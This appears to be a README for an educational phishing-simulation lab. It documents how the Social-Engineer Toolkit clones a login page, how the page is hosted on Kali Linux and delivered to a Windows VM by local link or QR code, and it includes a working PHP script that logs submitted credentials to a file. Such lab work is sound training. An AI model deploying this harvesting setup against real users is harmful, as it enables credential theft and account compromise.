
# 📁 Project: Phishing Attack Simulation in an Isolated Virtual Lab

## 🧠 Overview
This project simulates a phishing attack in a controlled, isolated environment using Kali Linux, Social-Engineer Toolkit (SET), and a Windows 10 victim machine. It demonstrates how attackers create and deploy phishing pages, capture credentials, and log user interactions — all within a secure virtual lab.

## 🎯 Objectives
- Clone a legitimate login page
- Host the phishing page on Kali Linux
- Capture submitted credentials to a local log file
- Deliver the phishing link via local IP or QR code
- Simulate real-world phishing behavior in a safe environment

## 🛠️ Tools & Technologies
- Kali Linux
- Windows 10 (VirtualBox)
- Social-Engineer Toolkit (SET)
- Apache2 Web Server
- VirtualBox Host-only Networking
- PHP (for logging credentials)
- QR Code (Optional Delivery Vector)

## 🔧 Lab Setup

| Machine        | OS          | Role             | IP Address        |
|----------------|-------------|------------------|-------------------|
| Kali Linux VM  | Kali 2023.4 | Attacker/Host    | 192.168.56.101    |
| Windows 10 VM  | Win 10 Pro  | Victim           | 192.168.56.102    |

## 📂 Attack Workflow

### 1. Phishing Page Creation
- Launched SET Toolkit on Kali
- Used “Credential Harvester” module
- Cloned `http://testphp.vulnweb.com/login.php`
- Hosted the phishing site on Apache via `http://192.168.56.101`

### 2. Credential Logging Backend
Created `post.php` to log credentials:
```php
<?php
$log = "creds.txt";
$handle = fopen($log, "a");
foreach($_POST as $var => $value) {
    fwrite($handle, $var . "=" . $value . "\n");
}
fwrite($handle, "====================\n");
fclose($handle);
header('Location: index.html');
?>
```

### 3. Delivery
- Delivered phishing link via browser on Windows VM
- Optional: generated a QR code pointing to `http://192.168.56.101`

### 4. Data Collection
- Captured credentials stored in `/var/www/html/creds.txt`

## 📸 Screenshots
- [x] Phishing page clone in browser
- [x] `creds.txt` showing harvested logins
- [x] QR code (optional vector)
- [x] Network config screenshot (Host-only setup)

## ✅ Learning Outcomes
- Understood how phishing infrastructure works
- Built secure lab networks with VirtualBox
- Demonstrated credential harvesting and phishing vector delivery
- Practiced ethical hacking techniques within a safe environment

## 🔐 Disclaimer
This project was conducted **entirely within a private virtual lab environment**. No real users were targeted, and no real credentials were captured. This work was done for **educational purposes only** as part of cybersecurity lab development and personal growth.
